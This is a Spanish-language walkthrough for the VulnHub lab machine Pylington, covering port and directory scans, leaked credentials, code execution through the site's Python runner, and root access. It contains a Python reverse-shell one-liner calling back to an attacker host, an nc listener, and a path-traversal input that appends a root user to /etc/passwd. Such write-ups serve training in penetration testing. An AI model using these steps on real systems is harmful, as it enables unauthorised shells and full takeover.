---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PYLINGTON VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sS <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 12:13 EDT
Nmap scan report for 192.168.5.146
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)
| ssh-hostkey: 
|   3072 bf:ba:23:4e:69:37:69:9f:23:ae:21:35:98:4d:39:fa (RSA)
|   256 ed:95:53:52:ef:70:1f:c0:0e:3c:d8:be:35:fc:3a:93 (ECDSA)
|_  256 2d:b8:b0:88:52:83:7b:00:47:31:a4:76:2b:3d:7d:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Pylington Cloud | The best way to run Python.
| http-robots.txt: 3 disallowed entries 
|_/register /login /zbir7mn240soxhicso2z
MAC Address: 00:0C:29:5E:53:7E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms 192.168.5.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,html,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.146/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 993]
/.htaccess            (Status: 403) [Size: 993]
/.htpasswd.php        (Status: 403) [Size: 993]
/.htpasswd.txt        (Status: 403) [Size: 993]
/.htaccess.txt        (Status: 403) [Size: 993]
/.htpasswd            (Status: 403) [Size: 993]
/.htaccess.php        (Status: 403) [Size: 993]
/.htaccess.html       (Status: 403) [Size: 993]
/404.html             (Status: 200) [Size: 3305]
/assets               (Status: 200) [Size: 1536]
/favicon.ico          (Status: 200) [Size: 15406]
/index.html           (Status: 200) [Size: 4065]
/login                (Status: 200) [Size: 3475]
/register             (Status: 200) [Size: 3149]
/robots.txt           (Status: 200) [Size: 83]
/robots.txt           (Status: 200) [Size: 83]
/~bin                 (Status: 403) [Size: 993]
/~root                (Status: 403) [Size: 993]
/~mail                (Status: 403) [Size: 993]
/~ftp                 (Status: 403) [Size: 993]
/~nobody              (Status: 403) [Size: 993]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Por lo que podemos ver hay una `/robots.txt/` y si nos metemos dentro encontraremos lo siguiente...

```
User-agent: *
Disallow: /register
Disallow: /login
Disallow: /zbir7mn240soxhicso2z
```

Si nos vamos a la siguiente `URL` llamada `/zbir7mn240soxhicso2z` veremos lo siguiente...

```
Username: steve

Password: bvbkukHAeVxtjjVH
```

Nos dan las credenciales de un usuario llamado `steve` por lo que nos logeamos en `/login/` y cuando metamos esas credenciales, nos pondra un mensaje de bienvenida pinchamos en ese `Welcome back! Steve` y nos redirigira a la `URL` llamada `n8pji3yeaccqvek2uzfc` donde se encontrara por lo que parece una especie de `Output` para enviar comandos mediante `python`...

Si en el `Program` metemos lo siguiente...

```python
i = input("")
exec(i)
```

Y en el `Standard Input` metemos lo siguiente...

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

Lo rellenamos acorde a nuestras necesidades y estando a la escucha...

```shell
nc -lvnp <PORT>
```

Le damos a `run` una vez ejecutado nos creara una `shell` con el servidor...

Si nos vamos a `/home/py/` encontraremos muchas cosas pero entre ellas un minijuego llamado `typing` por lo que haremos lo siguiente...

```shell
./typing
```

Esto iniciara el minijuego y veremos lo siguiente...

```
Let's play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
```

Por lo que tendremos que responder con la siguiente respuesta...

```
the quick brown fox jumps over the lazy dog
```

Una vez hecho eso nos mostrara la contraseña del usuario `py`...

```
User = py
Password = 54ezhCGaJV
```

Nos conectaremos por `ssh`...

```shell
ssh py@192.168.5.146
```

Metemos la `passeord` y ya estariamos dentro, leemos la flag...

> user.txt (flag1)

```
ee11cbb19052e40b07aac0ca060c23ee
```

Por lo que podremos ver hay un archivo llamado `backup` en una carpeta `secreta` lo podemos ejecutar como `root` de normal, por lo que haremos lo siguiente...

En nuestro `host` generaremos una contraseña para el `passwd`...

```shell
openssl passwd -1 -salt <username> <password>
```

Info:

En mi caso con lo que le implemente me salio esto...

```
$1$diseo$tBqyKr.3ZHUYVzTIqyJg0/
```

Dentro del servidor victima hacemos lo siguiente...

```shell
/home/py/secret_stuff/backup
```

```
Enter a line of text to back up: <USERNAME>:<OPENSSL_GENERATE>:0:0:/root:/bin/zsh

Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../../../etc/passwd
```

Una vez hecho esto haremos lo siguiente...

```shell
su <USERNAME> 
```

Nos cambiamos al usuario que agregamos al `passwd` y con la contraseña que generamos tambien, por lo que ya seriamos `root`...

Leemos la flag...

> root.txt (flag2)

```
63a9f0ea7bb98050796b649e85481845
```
